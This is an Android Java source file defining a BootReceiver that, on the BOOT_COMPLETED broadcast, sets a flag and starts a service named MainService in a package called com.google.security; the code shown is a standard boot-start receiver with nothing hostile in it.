package com.google.security;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver {

	static final String ACTION = "android.intent.action.BOOT_COMPLETED";

	static boolean bootFlag = false;

	@Override
	public void onReceive(Context context, Intent intent) {

		if (intent.getAction().equals(ACTION)) {
			bootFlag = true;
			context.startService(new Intent(context, MainService.class));
		}
	}
}